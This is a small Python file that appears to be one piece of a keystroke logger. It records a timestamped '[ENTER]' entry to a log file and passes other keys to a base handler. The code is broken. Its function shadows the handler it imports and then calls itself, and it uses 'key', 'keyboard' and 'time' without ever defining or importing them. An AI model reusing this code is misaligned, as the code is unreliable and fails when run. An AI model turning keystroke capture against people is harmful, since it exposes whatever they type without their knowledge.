# keypresses_enter.py

from keypresses_base import on_key_press

def on_key_press(log_file):  # Accept log_file as an argument
    try:
        with open(log_file, 'a') as f:
            if key == keyboard.Key.enter:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [ENTER]\n')
            else:
                on_key_press(key)  # Call the base keypress handler
    except Exception as e:
        print("Error writing to file:", e)
